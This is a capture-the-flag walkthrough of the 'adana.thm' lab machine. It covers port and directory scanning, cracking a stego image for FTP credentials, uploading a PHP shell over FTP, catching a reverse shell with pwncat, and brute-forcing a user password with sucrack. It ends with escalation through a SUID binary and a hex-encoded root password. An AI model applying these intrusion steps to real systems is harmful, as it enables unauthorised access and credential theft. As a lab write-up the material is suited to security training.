# Different Ctf

## nmap Quich Port Scan
```ruby
$ nmap -v 10.10.224.181
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

```
## Scan On post 80

### whatweb scanning
```ruby
$ whatweb  10.10.224.181
http://10.10.224.181 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.224.181], MetaGenerator[WordPress 5.6], PoweredBy[WordPress], Script, Title[Hello World &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[5.6]
```
* Ubuntu
* Apache 2.2.29
* Wordpress 5.6

ok lets take a look at the url in browser.

The Page just has simple html, once you take your cursor place over any `Hello world!` it gives the host name `adana.thm`.

configure the host name to the ip

`$ sudo vim /etc/hosts`

```php
10.10.224.181 adana.thm
```
now it accessable

## Gather some more info by nmap on port 21 & 80

```ruby
$ nmap -vv -p 21,80 10.10.224.181 -sC -sV -T4

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Hello World &#8211; Just another WordPress site
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: WordPress 5.6
Service Info: OS: Unix

```

### Find directories by Gobuster
```ruby
gobuster dir -u http://adana.thm/ -t 30 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://adana.thm/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/04/22 00:14:15 Starting gobuster in directory enumeration mode
===============================================================
/wp-includes          (Status: 301) [Size: 312] [--> http://adana.thm/wp-includes/]
/wp-admin             (Status: 301) [Size: 309] [--> http://adana.thm/wp-admin/]   
/wp-content           (Status: 301) [Size: 311] [--> http://adana.thm/wp-content/] 
/javascript           (Status: 301) [Size: 311] [--> http://adana.thm/javascript/] 
/phpmyadmin           (Status: 301) [Size: 311] [--> http://adana.thm/phpmyadmin/] 
/a************        (Status: 301) [Size: 314] [--> http://adana.thm/a***********/]

```

I got the directory `/a***********` that have `/a************/wordlist.txt` and image file 

I think its a stegnography and the `wordlist.txt` used for crack it.

I quickly tried it `while read i; do echo $(steghide extract -sf  austrailian-bulldog-ant.jpg -p $i 2>/dev/null);done < wordlist.txt `

* Waste of time, So there is tool available to crack , I search it via apt 

```ruby
$ apt search steg | grep crack

WARNING: apt does not have a stable CLI interface. Use with caution in scripts.

stegcracker/parrot,parrot,now 2.1.0-1 all

```

To Install stegcracker

`$ apt install stegcracker`


### Time to crack

`$ stegcracker austrailian-bulldog-ant.jpg wordlist.txt -t 200`

It cracked on `1*************`

I Got the file `something.out` It has some base64 encoded


```bash
⇝ cat austrailian-bulldog-ant.jpg.out | base64 -d
```
I got userName and Password for ftp

once I Logged in It's site file tree, well try to upload the shell

```ruby
$ ftp 10.10.224.181
Connected to 10.10.224.181.
220 (vsFTPd 3.0.3)
Name (10.10.224.181:black): ha******
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.


ftp> put shell.php

local: shell.php remote: shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
2587 bytes sent in 0.00 secs (32.8954 MB/s)

ftp> chmod 777 shell.php


200 SITE CHMOD command ok.


```


Listen with pwncat

```php 
$ pwncat-cs -lp 4441
[01:11:01] Welcome to pwncat 🐈!        
```

Let's access the `/shell.php` the 

```post
Not Found

The requested URL was not found on this server.
Apache/2.4.29 (Ubuntu) Server at adana.thm Port 80
```

so I download the `wp-config.php` by `ftp> get wp-config.php` 
And I dot the password for *phpmyadmin*

once I logged in there are two folders `phpmyadmin` and `phpmyadmin1`

in the `phpmyadmin1` I got the `sub******.adana.thm` and I add it into `/etc/hosts`

this domain help to get the reverse shell .

First flag found in /var/www/html/

`THM{*******************************}`

I just upload the sucrack by pwncat

```ruby
(local) pwncat$ upload /usr/bin/sucrack
./sucrack ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 30.8/30.8 KB • ? • 0:00:00
[02:05:47] uploaded 30.79KiB in 7.82 seconds 
```

and than I cracked by the wordlist that is already available in the server




```ruby
$ cat /var/www/html/announcements/wordlist.txt | sed 's/^/123adana/' > /tmp/wl.txt
$ /tmp/sucrack  -w 100 -u hakanbey /tmp/wl.txt
```

it take too much time


Once It get cracked login in to hakanbey

```ruby
$ su hakanbey
password: 123adanas*****

hakanbey@ubuntu:/tmp/sucrack-master$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

Password: 
Sorry, user hakanbey may not run sudo on ubuntu.




$ find / -perm -u=s -type f 2>/dev/null
/bin/su
/bin/umount
/bin/mount
/bin/ping
/usr/local/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/arping
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/binary
/usr/bin/at
/usr/bin/newgrp
/usr/sbin/pppd
/usr/sbin/exim4

```

there is `/usr/bin/binary` suspicious file

```ruby
$ ltrace /usr/bin/binary 
strcat("war", "zone")                                                                                                = "warzone"
strcat("warzone", "in")                                                                                              = "warzonein"
strcat("warzonein", "ada")                                                                                           = "warzoneinada"
strcat("warzoneinada", "na")                                                                                         = "warzoneinadana"
printf("I think you should enter the cor"...)                                                                        = 52
__isoc99_scanf(0x556a0794bedd, 0x7fff88cb4820, 0, 0I think you should enter the correct string here ==>warzoneinadana
)                                                                 = 1
strcmp("warzoneinadana", "warzoneinadana")                                                                           = 0
fopen("/root/hint.txt", "r")                                                                                         = 0
__isoc99_fscanf(0, 0x556a0794bedd, 0x7fff88cb4840, 1 <no return ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++

```

* there is a strcmp() that compare for the string `warzoneinadana`.
* so provide this string to get the file `/root/root.jpg`


I downloaded the file using pwncat

```bash
(local) pwncat$ download root.jpg
root.jpg ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 45.8/45.8 KB • ? • 0:00:00
[13:51:01] downloaded 45.84KiB in 2.81 seconds

```

```ruby
(black@d4rk-pr0xy) ⇝ xxd root.jpg

00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 0060  ......JFIF.....`
00000010: 0060 0000 ffe1 0078 4578 6966 0000 4d4d  .`.....xExif..MM

*  00000020: fee9 9d3d 7918 5ffc 826d df1c 69ac c275  ...=y._..m..i..u

00000030: 0000 0056 0301 0005 0000 0001 0000 0068  ...V...........h
00000040: 0303 0001 0000 0001 0000 0000 5110 0001  ............Q...
00000050: 0000 0001 0100 0000 5111 0004 0000 0001  ........Q.......
00000060: 0000 0ec4 5112 0004 0000 0001 0000 0ec4  ....Q...........
00000070: 0000 0000 4164 6f62 6520 496d 6167 6552  ....Adobe ImageR
00000080: 6561 6479 0000 0001 86a0 0000 b18f ffdb  eady............
00000090: 0043 0002 0101 0201 0102 0202 0202 0202  .C..............
```

I took the stared hex `fee9 9d3d 7918 5ffc 826d df1c 69ac c275` and put it in to the [cybercheff](https://cyberchef.org/)
And I use *fromHex* and *toBase85* Operation.

that's it I got the root pass
















